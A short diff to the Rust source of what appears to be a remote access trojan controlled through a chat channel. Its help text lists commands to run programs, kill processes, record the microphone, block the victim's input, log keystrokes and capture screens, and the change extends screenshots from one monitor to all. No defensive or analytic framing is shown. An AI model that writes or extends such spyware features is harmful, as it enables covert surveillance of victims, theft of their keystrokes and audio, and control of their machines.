@@ -18,7 +18,7 @@ const HELP: &str = "\
 !exec <exe> [args]         launch detached
 !ps                        process list
 !kill <pid>                terminate pid
-!screenshot                primary monitor -> files channel
+!screenshot                all monitors -> files channel
 !mic <secs>                record default mic -> files channel
 !freeze [secs]             block input; secs = auto-release (e.g. !freeze 30)
 !keylog start|stop|dump|clear
